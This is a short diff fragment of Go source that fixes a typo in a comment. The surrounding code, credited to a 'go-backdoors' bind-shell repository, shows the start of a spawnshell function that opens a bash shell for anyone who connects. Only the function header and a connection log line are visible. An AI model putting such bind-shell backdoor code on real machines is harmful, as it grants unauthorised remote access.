@@ -8,7 +8,7 @@ import
 "syscall"
 )
 //shell handing credits: https://github.com/LukeDSchenk/go-backdoors/blob/master/bindshell.go
-//After a connection is made, it createds a bash shell
+//After a connection is made, it creates a bash shell
 func spawnshell(conn net.Conn) {
     //lists the machine that connected
     fmt.Printf("\n[+] Received connection from %v\n", conn.RemoteAddr().String())
